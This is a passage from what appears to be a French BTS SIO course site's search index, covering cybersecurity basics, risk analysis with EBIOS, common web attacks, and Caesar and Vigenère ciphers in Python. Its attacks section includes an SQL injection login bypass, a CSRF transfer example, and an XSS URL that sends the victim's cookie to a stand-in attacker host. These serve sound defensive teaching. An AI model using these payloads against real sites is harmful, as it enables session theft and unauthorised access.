donn\u00e9es : SQL Server / SQLite</li> <li>ORM : Entity Framework Core</li> <li>Interface : Bootstrap + CSS personnalis\u00e9</li> <li>Tests : xUnit</li> </ul>"},{"location":"BTS/B2/B3_1_Fondamentaux_cybersecurite/","title":"B3 1 Fondamentaux cybersecurite","text":"B3.1 - Fondamentaux de la Cybers\u00e9curit\u00e9 <p>Risques, menaces et m\u00e9thode EBIOS - BTS SIO</p> \ud83d\udd10 Les fondamentaux de la cybers\u00e9curit\u00e9 Cybers\u00e9curit\u00e9  La cybers\u00e9curit\u00e9 est l'ensemble des technologies, processus et pratiques con\u00e7us pour prot\u00e9ger les r\u00e9seaux, appareils, programmes et donn\u00e9es contre les attaques, dommages ou acc\u00e8s non autoris\u00e9s.  \ud83d\udd10 Les trois piliers de la s\u00e9curit\u00e9 informatique \ud83d\udd12 Confidentialit\u00e9  Garantir que l'information n'est accessible qu'aux personnes autoris\u00e9es. Protection contre la divulgation non autoris\u00e9e.  \u2705 Int\u00e9grit\u00e9  Assurer que l'information n'a pas \u00e9t\u00e9 modifi\u00e9e de mani\u00e8re non autoris\u00e9e. Protection contre l'alt\u00e9ration des donn\u00e9es.  \ud83c\udf10 Disponibilit\u00e9  Garantir l'acc\u00e8s aux informations et services quand ils sont n\u00e9cessaires. Protection contre les interruptions de service.  \u26a0\ufe0f Risques et menaces Distinction fondamentale Risque : Probabilit\u00e9 qu'une menace exploite une vuln\u00e9rabilit\u00e9 et cause un dommage Menace : Cause potentielle d'un incident ind\u00e9sirable Vuln\u00e9rabilit\u00e9 : Faiblesse qui peut \u00eatre exploit\u00e9e par une menace  Types de menaces \ud83c\udfad Menaces humaines <ul> <li>Attaquants externes (hackers)</li> <li>Employ\u00e9s malveillants</li> <li>Erreurs humaines</li> <li>Ing\u00e9nierie sociale</li> </ul> \ud83d\udcbb Menaces techniques <ul> <li>Malwares (virus, trojans)</li> <li>Failles logicielles</li> <li>Attaques r\u00e9seau</li> <li>D\u00e9faillances syst\u00e8me</li> </ul> \ud83c\udf0d Menaces environnementales <ul> <li>Catastrophes naturelles</li> <li>Pannes \u00e9lectriques</li> <li>Incendies</li> <li>D\u00e9g\u00e2ts des eaux</li> </ul> \u2696\ufe0f Menaces l\u00e9gales <ul> <li>Non-conformit\u00e9 RGPD</li> <li>Violations contractuelles</li> <li>Sanctions r\u00e9glementaires</li> <li>Litiges juridiques</li> </ul>  \ud83d\udca1 Fait important : 95% des cyberattaques r\u00e9ussies sont dues \u00e0 une erreur humaine. La sensibilisation des utilisateurs est donc cruciale."},{"location":"BTS/B2/B3_1_Fondamentaux_cybersecurite/#points-de-cours-essentiels","title":"\ud83d\udcda Points de cours essentiels","text":"\ud83c\udf0d Axe 1 - Les enjeux de la cybers\u00e9curit\u00e9  La cybers\u00e9curit\u00e9 est un enjeu majeur pour les entreprises car une attaque peut avoir des cons\u00e9quences graves :  \ud83d\udcb0 Cons\u00e9quences financi\u00e8res <ul> <li>Perte d'argent directe</li> <li>Paiement de ran\u00e7ons</li> <li>Perte de clients et de revenus</li> <li>Co\u00fbts de rem\u00e9diation et de r\u00e9cup\u00e9ration</li> <li>Arr\u00eat de production</li> <li>Frais juridiques et d'expertise</li> </ul> \ud83d\udcc9 Cons\u00e9quences r\u00e9putationnelles <ul> <li>Perte de confiance des utilisateurs</li> <li>D\u00e9t\u00e9rioration de l'image de marque</li> <li>Impact sur les partenaires commerciaux</li> <li>Couverture m\u00e9diatique n\u00e9gative</li> <li>Perte de comp\u00e9titivit\u00e9</li> <li>Difficult\u00e9s de recrutement</li> </ul> \u2696\ufe0f Cons\u00e9quences juridiques <ul> <li>Sanctions RGPD (jusqu'\u00e0 4% du CA)</li> <li>Poursuites judiciaires</li> <li>Amendes r\u00e9glementaires</li> <li>Responsabilit\u00e9 civile et p\u00e9nale</li> <li>Obligations de notification</li> <li>Audits et contr\u00f4les renforc\u00e9s</li> </ul>  \ud83d\udc49 Exemple concret : En 2017, l'attaque WannaCry a paralys\u00e9 des h\u00f4pitaux en Europe et a co\u00fbt\u00e9 des millions d'euros. Le NHS britannique a estim\u00e9 ses pertes \u00e0 plus de 100 millions d'euros.  \u2696\ufe0f Axe 2 - Le cadre l\u00e9gal et normatif  Pour prot\u00e9ger les donn\u00e9es, les entreprises doivent respecter un cadre l\u00e9gal et normatif strict :  \ud83c\uddea\ud83c\uddfa RGPD (R\u00e8glement G\u00e9n\u00e9ral sur la Protection des Donn\u00e9es) <p>R\u00e8glement europ\u00e9en qui prot\u00e8ge les donn\u00e9es personnelles</p> <ul> <li>Consentement explicite et \u00e9clair\u00e9</li> <li>Droit \u00e0 l'oubli et \u00e0 la portabilit\u00e9</li> <li>Notification des violations sous 72h</li> <li>Amendes jusqu'\u00e0 4% du CA mondial</li> <li>D\u00e9signation d'un DPO si n\u00e9cessaire</li> <li>Privacy by design</li> </ul> \ud83c\uddeb\ud83c\uddf7 ANSSI (Agence Nationale de la S\u00e9curit\u00e9 des Syst\u00e8mes d'Information) <p>Organisme fran\u00e7ais qui d\u00e9finit les bonnes pratiques de s\u00e9curit\u00e9</p> <ul> <li>Guides de s\u00e9curit\u00e9 sectoriels</li> <li>Certification des produits de s\u00e9curit\u00e9</li> <li>Veille sur les menaces cyber</li> <li>Formation et sensibilisation</li> <li>R\u00e9ponse aux incidents majeurs</li> <li>R\u00e9f\u00e9rentiels de s\u00e9curit\u00e9</li> </ul> \ud83c\udf10 ISO 27001 <p>Norme internationale pour g\u00e9rer la s\u00e9curit\u00e9 des syst\u00e8mes d'information</p> <ul> <li>Syst\u00e8me de management de la s\u00e9curit\u00e9</li> <li>Analyse des risques obligatoire</li> <li>Am\u00e9lioration continue (PDCA)</li> <li>Certification par tierce partie</li> <li>114 mesures de s\u00e9curit\u00e9</li> <li>Audits r\u00e9guliers</li> </ul> \ud83d\udca5 Axe 3 - Exemples d'attaques  Quelques attaques courantes \u00e0 conna\u00eetre absolument :  \ud83c\udfa3 Phishing (Hame\u00e7onnage) <p>Mails frauduleux qui volent vos identifiants</p> <ul> <li>Usurpation d'identit\u00e9 d'organismes connus</li> <li>Sites web factices (spoofing)</li> <li>Vol de credentials et donn\u00e9es sensibles</li> <li>Ing\u00e9nierie sociale sophistiqu\u00e9e</li> <li>Spear phishing (cibl\u00e9)</li> <li>Taux de r\u00e9ussite : 30% des utilisateurs</li> </ul> \ud83d\udd12 Ransomware (Ran\u00e7ongiciel) <p>Virus qui bloque les fichiers et demande une ran\u00e7on</p> <ul> <li>Chiffrement des donn\u00e9es critiques</li> <li>Demande de ran\u00e7on en cryptomonnaie</li> <li>Propagation r\u00e9seau (mouvement lat\u00e9ral)</li> <li>Paralysie totale de l'activit\u00e9</li> <li>Double extorsion (vol + chiffrement)</li> <li>Co\u00fbt moyen : 4,5 millions d'euros</li> </ul> \ud83c\udf0a DDoS (D\u00e9ni de Service Distribu\u00e9) <p>Attaque qui rend un service inaccessible</p> <ul> <li>Saturation des serveurs et bande passante</li> <li>D\u00e9ni de service pour les utilisateurs l\u00e9gitimes</li> <li>R\u00e9seaux de bots (botnets)</li> <li>Impact direct sur la disponibilit\u00e9</li> <li>Attaques volum\u00e9triques ou applicatives</li> <li>Dur\u00e9e moyenne : 4 heures</li> </ul> \ud83d\udc89 Injection SQL <p>Attaque qui permet d'acc\u00e9der aux bases de donn\u00e9es</p> <ul> <li>Exploitation des formulaires web</li> <li>Acc\u00e8s non autoris\u00e9 aux donn\u00e9es</li> <li>Modification ou suppression de donn\u00e9es</li> <li>Escalade de privil\u00e8ges</li> <li>Contournement de l'authentification</li> <li>Impact : vol de donn\u00e9es massif</li> </ul> \ud83d\udcca Axe 4 - Calcul du risque (d\u00e9taill\u00e9) Formule fondamentale du risque Risque = Probabilit\u00e9 \u00d7 Impact \u00d7 Vuln\u00e9rabilit\u00e9 Version simplifi\u00e9e : Risque = Probabilit\u00e9 \u00d7 Impact \ud83d\udcc8 \u00c9valuation de la Probabilit\u00e9 \u00c9chelle de Probabilit\u00e9 <ul> <li>Tr\u00e8s faible (1) : &lt; 5% - \u00c9v\u00e9nement exceptionnel</li> <li>Faible (2) : 5-25% - \u00c9v\u00e9nement rare</li> <li>Moyenne (3) : 25-75% - \u00c9v\u00e9nement possible</li> <li>\u00c9lev\u00e9e (4) : 75-95% - \u00c9v\u00e9nement probable</li> <li>Tr\u00e8s \u00e9lev\u00e9e (5) : &gt; 95% - \u00c9v\u00e9nement quasi certain</li> </ul> Facteurs influen\u00e7ant la probabilit\u00e9 <ul> <li>Historique des incidents</li> <li>Niveau de menace sectoriel</li> <li>Attractivit\u00e9 de la cible</li> <li>Mesures de protection en place</li> <li>Contexte g\u00e9opolitique</li> <li>Vuln\u00e9rabilit\u00e9s connues</li> </ul> \ud83d\udca5 \u00c9valuation de l'Impact \u00c9chelle d'Impact <ul> <li>N\u00e9gligeable (1) : &lt; 10k\u20ac - Impact minimal</li> <li>Mineur (2) : 10k-100k\u20ac - Impact limit\u00e9</li> <li>Majeur (3) : 100k-1M\u20ac - Impact significatif</li> <li>Critique (4) : 1M-10M\u20ac - Impact grave</li> <li>Catastrophique (5) : &gt; 10M\u20ac - Impact majeur</li> </ul> Types d'impacts \u00e0 \u00e9valuer <ul> <li>Financier : Pertes directes et indirectes</li> <li>Op\u00e9rationnel : Arr\u00eat d'activit\u00e9</li> <li>R\u00e9putationnel : Image de marque</li> <li>Juridique : Sanctions et amendes</li> <li>Humain : S\u00e9curit\u00e9 des personnes</li> <li>Strat\u00e9gique : Avantage concurrentiel</li> </ul> \ud83e\uddee Matrice de Risque Impact \u2192Probabilit\u00e9 \u2193 N\u00e9gligeable Mineur Majeur Critique Tr\u00e8s faible FAIBLE(1\u00d71=1) FAIBLE(1\u00d72=2) MOYEN(1\u00d73=3) MOYEN(1\u00d74=4) Faible FAIBLE(2\u00d71=2) MOYEN(2\u00d72=4) MOYEN(2\u00d73=6) \u00c9LEV\u00c9(2\u00d74=8) Moyenne MOYEN(3\u00d71=3) MOYEN(3\u00d72=6) \u00c9LEV\u00c9(3\u00d73=9) \u00c9LEV\u00c9(3\u00d74=12) \u00c9lev\u00e9e MOYEN(4\u00d71=4) \u00c9LEV\u00c9(4\u00d72=8) \u00c9LEV\u00c9(4\u00d73=12) CRITIQUE(4\u00d74=16) \ud83c\udfaf Exemple de calcul d\u00e9taill\u00e9 \ud83d\udccb Sc\u00e9nario : Attaque ransomware sur une PME de 50 employ\u00e9s \ud83d\udd0d Analyse des composants : \u2022 Menace : Groupe de cybercriminels sp\u00e9cialis\u00e9 en ransomware \u2022 Vuln\u00e9rabilit\u00e9 : Absence de sauvegarde hors ligne + utilisateurs non sensibilis\u00e9s \u2022 Actif : Syst\u00e8me d'information complet (serveurs, postes, donn\u00e9es) \ud83d\udcca \u00c9valuation : \u2022 Probabilit\u00e9 : \u00c9lev\u00e9e (4/5) - Secteur cibl\u00e9, vuln\u00e9rabilit\u00e9s connues \u2022 Impact financier : Critique (4/5) - 500k\u20ac (arr\u00eat 2 semaines + ran\u00e7on + rem\u00e9diation) \u2022 Impact r\u00e9putationnel : Majeur (3/5) - Perte de confiance clients \u2022 Impact op\u00e9rationnel : Critique (4/5) - Arr\u00eat total d'activit\u00e9 \ud83e\uddee Calcul du risque : Risque = 4 \u00d7 4 = 16 \u2192 CRITIQUE \u26a1 Actions prioritaires : 1. Mise en place de sauvegardes 3-2-1 2. Formation anti-phishing des utilisateurs 3. Segmentation r\u00e9seau 4. Plan de continuit\u00e9 d'activit\u00e9  \ud83d\udd0e Axe 5 - Introduction \u00e0 la m\u00e9thode EBIOS EBIOS Risk Manager est une m\u00e9thode fran\u00e7aise d'analyse des risques d\u00e9velopp\u00e9e par l'ANSSI. Elle permet une approche structur\u00e9e et compl\u00e8te de l'\u00e9valuation des risques cyber.  \ud83c\udfaf Atelier 1 : D\u00e9finir le contexte Objectif : Quels actifs prot\u00e9ger ? \u2022 Identifier les biens essentiels (donn\u00e9es, processus, fonctions) \u2022 Cartographier les biens supports (mat\u00e9riels, logiciels, r\u00e9seaux) \u2022 D\u00e9finir le p\u00e9rim\u00e8tre d'\u00e9tude \u2022 Identifier les parties prenantes  \u26a0\ufe0f Atelier 2 : Identifier les \u00e9v\u00e9nements redout\u00e9s Objectif : Quels sont les impacts que l'on veut \u00e9viter ? \u2022 D\u00e9finir les \u00e9v\u00e9nements redout\u00e9s sur les biens essentiels \u2022 \u00c9valuer les impacts potentiels \u2022 Prioriser selon la gravit\u00e9 \u2022 \u00c9tablir les seuils d'acceptabilit\u00e9  \ud83c\udfad Atelier 3 : \u00c9tudier les sc\u00e9narios de menace Objectif : Comment les attaquants peuvent-ils proc\u00e9der ? \u2022 Identifier les sources de menaces \u2022 Analyser leurs motivations et capacit\u00e9s \u2022 Mod\u00e9liser les sc\u00e9narios d'attaque \u2022 \u00c9valuer la vraisemblance des sc\u00e9narios  \ud83d\udee1\ufe0f Atelier 4 : Identifier les mesures de s\u00e9curit\u00e9 Objectif : Quelles protections sont d\u00e9j\u00e0 en place ? \u2022 Inventorier les mesures existantes \u2022 \u00c9valuer leur efficacit\u00e9 \u2022 Identifier les lacunes \u2022 Proposer des mesures compl\u00e9mentaires  \ud83d\udcc8 Atelier 5 : \u00c9valuer le risque et proposer des solutions Objectif : Calculer le risque r\u00e9siduel et d\u00e9finir un plan d'action \u2022 Calculer les risques r\u00e9siduels \u2022 Comparer aux seuils d'acceptabilit\u00e9 \u2022 Proposer un plan de traitement \u2022 Planifier la mise en \u0153uvre et le suivi  \u2705 Axe 6 - Bonnes pratiques essentielles  Quelques gestes simples mais cruciaux pour renforcer la s\u00e9curit\u00e9 de votre organisation :  \ud83d\udd04 Mises \u00e0 jour et correctifs <ul> <li>Mettre \u00e0 jour r\u00e9guli\u00e8rement les logiciels et syst\u00e8mes</li> <li>Appliquer les correctifs de s\u00e9curit\u00e9 en priorit\u00e9</li> <li>Maintenir un inventaire des versions</li> <li>Automatiser les mises \u00e0 jour quand possible</li> <li>Tester avant d\u00e9ploiement en production</li> <li>Planifier les fen\u00eatres de maintenance</li> </ul> \ud83d\udd10 Authentification forte <ul> <li>Utiliser des mots de passe forts et uniques</li> <li>Activer l'authentification \u00e0 deux facteurs (MFA)</li> <li>D\u00e9ployer un gestionnaire de mots de passe</li> <li>Renouveler r\u00e9guli\u00e8rement les credentials</li> <li>Impl\u00e9menter l'authentification unique (SSO)</li> <li>Surveiller les tentatives de connexion</li> </ul> \ud83d\udcbe Sauvegardes et restauration <ul> <li>Sauvegarder r\u00e9guli\u00e8rement les donn\u00e9es critiques</li> <li>Appliquer la r\u00e8gle 3-2-1 (3 copies, 2 supports, 1 hors site)</li> <li>Tester r\u00e9guli\u00e8rement les restaurations</li> <li>Chiffrer les sauvegardes</li> <li>Automatiser les processus</li> <li>Documenter les proc\u00e9dures</li> </ul> \ud83d\udc65 Sensibilisation et formation <ul> <li>Former les utilisateurs au phishing</li> <li>Organiser des campagnes de sensibilisation</li> <li>R\u00e9aliser des simulations d'attaques</li> <li>D\u00e9velopper une culture de la s\u00e9curit\u00e9</li> <li>Mettre \u00e0 jour r\u00e9guli\u00e8rement les formations</li> <li>Mesurer l'efficacit\u00e9 des actions</li> </ul> \ud83d\udd12 Principe du moindre privil\u00e8ge <ul> <li>Ne donner que les droits strictement n\u00e9cessaires</li> <li>R\u00e9viser r\u00e9guli\u00e8rement les acc\u00e8s</li> <li>S\u00e9parer les environnements (dev/test/prod)</li> <li>Impl\u00e9menter un contr\u00f4le d'acc\u00e8s strict</li> <li>Surveiller les activit\u00e9s privil\u00e9gi\u00e9es</li> <li>Automatiser la gestion des droits</li> </ul> \ud83d\udd0d Surveillance et d\u00e9tection <ul> <li>D\u00e9ployer des outils de monitoring</li> <li>Analyser les logs de s\u00e9curit\u00e9</li> <li>Mettre en place des alertes</li> <li>Effectuer des audits r\u00e9guliers</li> <li>Utiliser l'intelligence artificielle</li> <li>Maintenir une veille sur les menaces</li> </ul>"},{"location":"BTS/B2/B3_2_Attaques_vulnerabilites/","title":"B3 2 Attaques vulnerabilites","text":"B3.2 - Attaques et Vuln\u00e9rabilit\u00e9s <p>Phishing, Injections SQL, XSS et autres menaces - BTS SIO</p> \ud83c\udfad Ing\u00e9nierie sociale et Phishing Ing\u00e9nierie sociale  Ensemble de techniques de manipulation psychologique utilis\u00e9es pour obtenir des informations confidentielles ou pousser une personne \u00e0 effectuer des actions compromettant la s\u00e9curit\u00e9.  Types d'attaques par ing\u00e9nierie sociale \ud83c\udfa3 Phishing  Envoi d'emails frauduleux imitant des organisations l\u00e9gitimes pour voler des identifiants ou installer des malwares.  \ud83c\udfaf Spear Phishing  Phishing cibl\u00e9 visant sp\u00e9cifiquement une personne ou organisation, avec des informations personnalis\u00e9es.  \ud83d\udc0b Whaling  Attaque ciblant sp\u00e9cifiquement les dirigeants d'entreprise (PDG, directeurs) pour obtenir des informations sensibles.  \ud83d\udcde Vishing  Phishing vocal utilisant le t\u00e9l\u00e9phone pour tromper les victimes et obtenir des informations confidentielles.  \ud83d\udcac Smishing  Phishing par SMS, utilisant des messages texte pour diriger vers des sites malveillants ou voler des donn\u00e9es.  \ud83d\udeaa Tailgating  Intrusion physique en suivant une personne autoris\u00e9e dans un b\u00e2timent s\u00e9curis\u00e9 sans badge d'acc\u00e8s.  Anatomie d'une attaque de phishing  \ud83d\udce7 \u00c9l\u00e9ments typiques d'un email de phishing : <ul> <li>Exp\u00e9diteur falsifi\u00e9 : Imitation d'une organisation connue</li> <li>Urgence artificielle : \"Votre compte sera suspendu\"</li> <li>Liens malveillants : Redirection vers des sites frauduleux</li> <li>Demande d'informations : Mots de passe, num\u00e9ros de carte</li> <li>Pi\u00e8ces jointes suspectes : Malwares d\u00e9guis\u00e9s</li> </ul> \ud83d\udc89 Injections SQL Injection SQL  Technique d'attaque consistant \u00e0 injecter du code SQL malveillant dans une application web pour acc\u00e9der, modifier ou supprimer des donn\u00e9es dans la base de donn\u00e9es.  M\u00e9canisme d'une injection SQL Exemple de code vuln\u00e9rable (PHP) <pre><code>// Code vuln\u00e9rable - JAMAIS faire cela !\n$username = $_POST['username'];\n$password = $_POST['password'];\n\n$query = \"SELECT * FROM users WHERE username = '$username' AND password = '$password'\";\n$result = mysqli_query($connection, $query);\n</code></pre> Payload d'attaque <pre><code>-- L'attaquant saisit comme nom d'utilisateur :\nadmin' OR '1'='1' --\n\n-- La requ\u00eate devient :\nSELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'motdepasse'\n\n-- R\u00e9sultat : Connexion r\u00e9ussie sans conna\u00eetre le mot de passe !\n</code></pre> Types d'injections SQL \ud83d\udd0d Union-based <p>Utilise l'op\u00e9rateur UNION pour combiner les r\u00e9sultats de plusieurs requ\u00eates et extraire des donn\u00e9es.</p> \u23f0 Time-based <p>Exploite les d\u00e9lais de r\u00e9ponse pour extraire des informations bit par bit de la base de donn\u00e9es.</p> \ud83d\udc41\ufe0f Boolean-based <p>Utilise des conditions vraies/fausses pour extraire des informations de la base de donn\u00e9es.</p> \u274c Error-based <p>Exploite les messages d'erreur de la base de donn\u00e9es pour obtenir des informations sur sa structure.</p> \ud83d\udee1\ufe0f Pr\u00e9vention des injections SQL <ul> <li>Requ\u00eates pr\u00e9par\u00e9es : Utilisation de param\u00e8tres li\u00e9s</li> <li>Validation des entr\u00e9es : Filtrage et \u00e9chappement</li> <li>Principe du moindre privil\u00e8ge : Comptes DB limit\u00e9s</li> <li>WAF : Web Application Firewall</li> </ul> \ud83c\udf10 Cross-Site Scripting (XSS) Cross-Site Scripting (XSS)  Vuln\u00e9rabilit\u00e9 permettant d'injecter du code JavaScript malveillant dans une page web, qui sera ensuite ex\u00e9cut\u00e9 par le navigateur des autres utilisateurs.  Types d'attaques XSS \ud83d\udd04 XSS R\u00e9fl\u00e9chi  Le script malveillant est inclus dans une requ\u00eate et renvoy\u00e9 imm\u00e9diatement dans la r\u00e9ponse. N\u00e9cessite que la victime clique sur un lien malveillant.  \ud83d\udcbe XSS Stock\u00e9  Le script malveillant est stock\u00e9 sur le serveur (base de donn\u00e9es, fichier) et ex\u00e9cut\u00e9 \u00e0 chaque fois qu'un utilisateur acc\u00e8de \u00e0 la page infect\u00e9e.  \ud83d\udcf1 XSS DOM  La vuln\u00e9rabilit\u00e9 existe dans le code JavaScript c\u00f4t\u00e9 client qui modifie le DOM de mani\u00e8re non s\u00e9curis\u00e9e.  Exemple d'attaque XSS Code vuln\u00e9rable (PHP) <pre><code>// Affichage direct de l'entr\u00e9e utilisateur - DANGEREUX !\necho \"Bonjour \" . $_GET['nom'];\n</code></pre> URL malveillante <pre><code>http://site-vulnerable.com/page.php?nom=&lt;script&gt;alert('XSS!')&lt;/script&gt;\n\n// Ou plus dangereux :\nhttp://site-vulnerable.com/page.php?nom=&lt;script&gt;document.location='http://attaquant.com/steal.php?cookie='+document.cookie&lt;/script&gt;\n</code></pre> \ud83d\udee1\ufe0f Pr\u00e9vention des attaques XSS <ul> <li>\u00c9chappement HTML : htmlspecialchars(), htmlentities()</li> <li>Validation des entr\u00e9es : Filtrage strict des donn\u00e9es</li> <li>Content Security Policy (CSP) : Contr\u00f4le des ressources</li> <li>HttpOnly cookies : Protection contre le vol de cookies</li> </ul> \ud83d\udd28 Autres attaques courantes Attaques par force brute \ud83d\udd10 Brute Force HTTP <p>Tentatives r\u00e9p\u00e9t\u00e9es de connexion avec diff\u00e9rents mots de passe pour forcer l'authentification.</p> \ud83d\udcdd Dictionary Attack <p>Utilisation d'une liste de mots de passe courants pour tenter de s'authentifier.</p> \ud83c\udf08 Rainbow Tables <p>Tables pr\u00e9calcul\u00e9es de hachages pour casser rapidement les mots de passe faibles.</p> Attaques sur les applications web Exemple d'attaque CSRF (Cross-Site Request Forgery) <pre><code>&lt;!-- Page malveillante qui force une action sur un autre site --&gt;\n&lt;img src=\"http://banque.com/transfer.php?to=attaquant&amp;amount=1000\" \n     style=\"display:none\"&gt;\n\n&lt;!-- L'utilisateur connect\u00e9 \u00e0 sa banque ex\u00e9cute involontairement le transfert --&gt;\n</code></pre>  \u26a0\ufe0f Statistiques alarmantes : <ul> <li>43% des cyberattaques ciblent les petites entreprises</li> <li>95% des violations de donn\u00e9es sont dues \u00e0 une erreur humaine</li> <li>Les attaques par phishing ont augment\u00e9 de 65% en 2023</li> <li>Le co\u00fbt moyen d'une violation de donn\u00e9es : 4,45 millions de dollars</li> </ul> \ud83d\udee1\ufe0f Strat\u00e9gies de d\u00e9fense D\u00e9fense en profondeur \ud83d\udc65 Formation utilisateurs  Sensibilisation aux risques, reconnaissance des tentatives de phishing, bonnes pratiques de s\u00e9curit\u00e9.  \ud83d\udd27 Mesures techniques  Pare-feu, antivirus, filtrage des emails, mise \u00e0 jour des syst\u00e8mes, chiffrement des donn\u00e9es.  \ud83d\udccb Politiques de s\u00e9curit\u00e9  Proc\u00e9dures claires, gestion des acc\u00e8s, politique de mots de passe, plan de r\u00e9ponse aux incidents.    ### Tests de s\u00e9curit\u00e9   \ud83d\udd0d Types de tests de s\u00e9curit\u00e9 <ul> <li>Tests de p\u00e9n\u00e9tration : Simulation d'attaques r\u00e9elles</li> <li>Audit de code : Analyse statique et dynamique</li> <li>Scan de vuln\u00e9rabilit\u00e9s : D\u00e9tection automatis\u00e9e</li> <li>Tests d'ing\u00e9nierie sociale : \u00c9valuation de la sensibilisation</li> </ul>"},{"location":"BTS/B2/B3_2_Attaques_vulnerabilites/#ressources-et-outils","title":"\ud83d\udcda Ressources et outils","text":"\ud83d\udd17 Outils de test et formation : <ul> <li>OWASP WebGoat : Application volontairement vuln\u00e9rable</li> <li>DVWA : Damn Vulnerable Web Application</li> <li>Metasploit : Framework de test de p\u00e9n\u00e9tration</li> <li>Burp Suite : Proxy d'interception pour tests web</li> <li>OWASP ZAP : Scanner de vuln\u00e9rabilit\u00e9s gratuit</li> </ul>"},{"location":"BTS/B2/B3_3_Cryptographie_chiffrement/","title":"B3 3 Cryptographie chiffrement","text":"B3.3 - Cryptographie et Chiffrement <p>C\u00e9sar, Vigen\u00e8re, Hash et Blockchain - BTS SIO</p>"},{"location":"BTS/B2/B3_3_Cryptographie_chiffrement/#objectifs-du-cours","title":"\ud83c\udfaf Objectifs du cours\ud83d\udd10 Fondamentaux de la cryptographie\ud83c\udfdb\ufe0f Chiffrement de C\u00e9sar\ud83d\udd24 Chiffrement de Vigen\u00e8re\ud83d\udd28 Fonctions de hachage\u26d3\ufe0f Introduction \u00e0 la Blockchain\ud83d\udcb0 Applications et cryptomonnaies","text":"<p>\u00c0 l'issue de ce cours, vous serez capable de : - Comprendre les principes fondamentaux de la cryptographie - Impl\u00e9menter les chiffrements C\u00e9sar et Vigen\u00e8re - Utiliser les fonctions de hachage pour s\u00e9curiser les donn\u00e9es - Appr\u00e9hender les bases de la blockchain et des cryptomonnaies</p> Cryptographie  Science qui \u00e9tudie les techniques de chiffrement permettant de prot\u00e9ger des informations en les rendant incompr\u00e9hensibles sans la cl\u00e9 de d\u00e9chiffrement appropri\u00e9e.  Types de cryptographie \ud83d\udd11 Cryptographie sym\u00e9trique  Utilise la m\u00eame cl\u00e9 pour chiffrer et d\u00e9chiffrer. Rapide mais n\u00e9cessite un \u00e9change s\u00e9curis\u00e9 de la cl\u00e9.  \ud83d\udd10 Cryptographie asym\u00e9trique  Utilise une paire de cl\u00e9s (publique/priv\u00e9e). Plus s\u00e9curis\u00e9 pour l'\u00e9change mais plus lent.  \ud83d\udd28 Fonctions de hachage  Transforment des donn\u00e9es de taille variable en une empreinte de taille fixe. Irr\u00e9versible et unique.   \ud83d\udd0d Principe de Kerckhoffs : La s\u00e9curit\u00e9 d'un syst\u00e8me cryptographique ne doit reposer que sur le secret de la cl\u00e9, jamais sur celui de l'algorithme.  Chiffrement de C\u00e9sar  Technique de chiffrement par substitution o\u00f9 chaque lettre du texte est remplac\u00e9e par une lettre situ\u00e9e \u00e0 une position fixe dans l'alphabet (d\u00e9calage).  Principe du chiffrement C\u00e9sar Exemple avec un d\u00e9calage de 3 Texte clair ABCDEFGHIJ Texte chiffr\u00e9 DEFGHIJKLM <p>Exemple : \"HELLO\" \u2192 \"KHOOR\"</p> Impl\u00e9mentation en Python Chiffrement de C\u00e9sar en Python <pre><code>def chiffrement_cesar(texte, decalage):\n    \"\"\"\n    Chiffre un texte avec le chiffrement de C\u00e9sar\n    \"\"\"\n    resultat = \"\"\n\n    for caractere in texte:\n        if caractere.isalpha():\n            # D\u00e9terminer si c'est une majuscule ou minuscule\n            debut = ord('A') if caractere.isupper() else ord('a')\n\n            # Appliquer le d\u00e9calage avec modulo 26\n            nouveau_char = chr((ord(caractere) - debut + decalage) % 26 + debut)\n            resultat += nouveau_char\n        else:\n            # Garder les caract\u00e8res non alphab\u00e9tiques\n            resultat += caractere\n\n    return resultat\n\ndef dechiffrement_cesar(texte_chiffre, decalage):\n    \"\"\"\n    D\u00e9chiffre un texte chiffr\u00e9 avec C\u00e9sar\n    \"\"\"\n    return chiffrement_cesar(texte_chiffre, -decalage)\n\n# Exemple d'utilisation\nmessage = \"HELLO WORLD\"\nmessage_chiffre = chiffrement_cesar(message, 3)\nprint(f\"Message original : {message}\")\nprint(f\"Message chiffr\u00e9 : {message_chiffre}\")\nprint(f\"Message d\u00e9chiffr\u00e9 : {dechiffrement_cesar(message_chiffre, 3)}\")\n</code></pre> Cryptanalyse du chiffrement C\u00e9sar \ud83d\udd0d Attaque par force brute <p>Tester les 25 cl\u00e9s possibles (d\u00e9calages de 1 \u00e0 25) jusqu'\u00e0 obtenir un texte coh\u00e9rent.</p> \ud83d\udcca Analyse fr\u00e9quentielle <p>Analyser la fr\u00e9quence des lettres et comparer avec les fr\u00e9quences typiques de la langue.</p> Chiffrement de Vigen\u00e8re  Am\u00e9lioration du chiffrement de C\u00e9sar utilisant un mot-cl\u00e9 pour varier le d\u00e9calage. Chaque lettre du message est chiffr\u00e9e avec un d\u00e9calage diff\u00e9rent bas\u00e9 sur le mot-cl\u00e9.  Principe du chiffrement Vigen\u00e8re Exemple avec le mot-cl\u00e9 \"KEY\" Message HELLOWORLD Cl\u00e9 r\u00e9p\u00e9t\u00e9e KEYKEYKEYK D\u00e9calage 10424104241042410 R\u00e9sultat RIJVSUYVJN Impl\u00e9mentation en Python Chiffrement de Vigen\u00e8re en Python <pre><code>def chiffrement_vigenere(texte, cle):\n    \"\"\"\n    Chiffre un texte avec le chiffrement de Vigen\u00e8re\n    \"\"\"\n    resultat = \"\"\n    cle = cle.upper()\n    index_cle = 0\n\n    for caractere in texte:\n        if caractere.isalpha():\n            # D\u00e9terminer la base (A ou a)\n            debut = ord('A') if caractere.isupper() else ord('a')\n\n            # Calculer le d\u00e9calage bas\u00e9 sur la cl\u00e9\n            decalage = ord(cle[index_cle % len(cle)]) - ord('A')\n\n            # Appliquer le chiffrement\n            nouveau_char = chr((ord(caractere.upper()) - ord('A') + decalage) % 26 + debut)\n            resultat += nouveau_char\n\n            index_cle += 1\n        else:\n            resultat += caractere\n\n    return resultat\n\ndef dechiffrement_vigenere(texte_chiffre, cle):\n    \"\"\"\n    D\u00e9chiffre un texte chiffr\u00e9 avec Vigen\u00e8re\n    \"\"\"\n    resultat = \"\"\n    cle = cle.upper()\n    index_cle = 0\n\n    for caractere in texte_chiffre:\n        if caractere.isalpha():\n            debut = ord('A') if caractere.isupper() else ord('a')\n            decalage = ord(cle[index_cle % len(cle)]) - ord('A')\n\n            # Soustraire le d\u00e9calage pour d\u00e9chiffrer\n            nouveau_char = chr((ord(caractere.upper()) - ord('A') - decalage) % 26 + debut)\n            resultat += nouveau_char\n\n            index_cle += 1\n        else:\n            resultat += caractere\n\n    return resultat\n\n# Exemple d'utilisation\nmessage = \"HELLO 